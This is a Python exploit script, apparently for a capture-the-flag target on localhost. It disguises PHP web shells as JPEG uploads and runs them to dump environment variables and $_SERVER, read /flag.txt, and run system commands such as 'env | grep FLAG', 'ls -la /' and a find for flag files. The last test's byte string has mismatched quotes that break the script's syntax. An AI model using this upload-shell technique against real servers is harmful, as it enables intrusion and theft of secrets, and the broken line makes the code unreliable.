import requests
import re

base_url = "http://127.0.0.1:33021"

# Create minimal valid JPEG
def create_minimal_jpeg():
    jpeg = b'\xff\xd8'
    jpeg += b'\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
    jpeg += b'\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t'
    jpeg += b'\x08\x0a\x0c\x14\x0d\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a'
    jpeg += b'\x1f\x1e\x1d\x1a\x1c\x1c $.\x28 #\x17\x1c,),.444444)\x22\x22\x22'
    jpeg += b'\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00'
    jpeg += b'\xff\xc4\x00\x1f\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00'
    jpeg += b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b'
    jpeg += b'\xff\xda\x00\x08\x01\x01\x00\x00?\x00'
    jpeg += b'\x7f\xd4\xb5\xa8\x88'
    jpeg += b'\xff\xd9'
    return jpeg

jpeg_content = create_minimal_jpeg()

# Test 1: Upload shell that reads environment variables
print("[*] TEST 1: Upload shell to read FLAG environment variable")
shell_jpeg = jpeg_content + b'<?php echo "FLAG_START"; echo getenv("FLAG"); echo "FLAG_END"; ?>'
files = {'userfile': ('flag_shell.jpg', shell_jpeg, 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Upload response: {r.text[:500]}")

# Extract filename
match = re.search(r"href='upload/([^']+)'", r.text)
if match:
    filename = match.group(1)
    print(f"[+] Uploaded as: {filename}")
    
    # Access the shell
    r2 = requests.get(f"{base_url}/upload/{filename}")
    print(f"[+] Shell response: {r2.text}")
    
    # Extract FLAG
    flag_match = re.search(r'FLAG_START(.*)FLAG_END', r2.text)
    if flag_match:
        print(f"[!!!] FLAG: {flag_match.group(1)}")

# Test 2: Try all environment variables
print("\n[*] TEST 2: Dump all environment variables")
env_shell = jpeg_content + b'<?php echo "<pre>"; print_r($_ENV); echo "</pre>"; ?>'
files = {'userfile': ('env_dump.jpg', env_shell, 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
match = re.search(r"href='upload/([^']+)'", r.text)
if match:
    filename = match.group(1)
    r2 = requests.get(f"{base_url}/upload/{filename}")
    print(f"[+] Environment dump:\n{r2.text}")

# Test 3: Try $_SERVER
print("\n[*] TEST 3: Dump $_SERVER")
server_shell = jpeg_content + b'<?php echo "<pre>"; print_r($_SERVER); echo "</pre>"; ?>'
files = {'userfile': ('server_dump.jpg', server_shell, 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
match = re.search(r"href='upload/([^']+)'", r.text)
if match:
    filename = match.group(1)
    r2 = requests.get(f"{base_url}/upload/{filename}")
    # Look for FLAG in the dump
    if 'FLAG' in r2.text:
        print(f"[!!!] FLAG found in $_SERVER!")
        flags = re.findall(r'FLAG\{[^}]+\}', r2.text)
        print(f"FLAGS: {flags}")

# Test 4: Direct getenv call
print("\n[*] TEST 4: Direct getenv")
getenv_shell = jpeg_content + b'<?php $f = getenv("FLAG"); if($f) echo "FLAG:" . $f; else echo "NO_FLAG_ENV"; ?>'
files = {'userfile': ('getenv.jpg', getenv_shell, 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
match = re.search(r"href='upload/([^']+)'", r.text)
if match:
    filename = match.group(1)
    r2 = requests.get(f"{base_url}/upload/{filename}")
    print(f"[+] getenv response: {r2.text}")

# Test 5: Try to read /flag.txt
print("\n[*] TEST 5: Read /flag.txt file")
flag_file_shell = jpeg_content + b'<?php echo file_get_contents("/flag.txt"); ?>'
files = {'userfile': ('flag_file.jpg', flag_file_shell, 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
match = re.search(r"href='upload/([^']+)'", r.text)
if match:
    filename = match.group(1)
    r2 = requests.get(f"{base_url}/upload/{filename}")
    print(f"[+] flag.txt content: {r2.text}")

# Test 6: Shell command to check environment
print("\n[*] TEST 6: System command env")
env_cmd_shell = jpeg_content + b'<?php system("env | grep FLAG"); ?>'
files = {'userfile': ('env_cmd.jpg', env_cmd_shell, 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
match = re.search(r"href='upload/([^']+)'", r.text)
if match:
    filename = match.group(1)
    r2 = requests.get(f"{base_url}/upload/{filename}")
    print(f"[+] env | grep FLAG: {r2.text}")

# Test 7: Shell command to list files
print("\n[*] TEST 7: List root directory")
ls_shell = jpeg_content + b'<?php system("ls -la /"); ?>'
files = {'userfile': ('ls.jpg', ls_shell, 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
match = re.search(r"href='upload/([^']+)'", r.text)
if match:
    filename = match.group(1)
    r2 = requests.get(f"{base_url}/upload/{filename}")
    print(f"[+] ls -la /: {r2.text}")

# Test 8: Try to find flag file
print("\n[*] TEST 8: Find flag file")
find_shell = jpeg_content + b'<?php system("find / -name '*flag*' 2>/dev/null"); ?>'
files = {'userfile': ('find.jpg', find_shell, 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
match = re.search(r"href='upload/([^']+)'", r.text)
if match:
    filename = match.group(1)
    r2 = requests.get(f"{base_url}/upload/{filename}")
    print(f"[+] find flag: {r2.text}")

